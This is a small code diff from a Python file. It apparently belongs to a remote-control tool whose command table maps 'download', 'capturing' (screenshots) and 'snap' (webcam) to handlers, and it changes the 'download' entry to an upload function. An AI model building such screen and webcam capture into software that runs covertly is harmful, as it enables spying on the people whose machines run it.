@@ -10,7 +10,7 @@ from cv2 import cv2
 import pyscreenshot as ImageGrab
 
 command_lookup = {
-    "download": commands.download_cli,
+    "download": commands.upload,
     "capturing": commands.screenshot_cli,
     "snap": commands.webcam_cli
 }
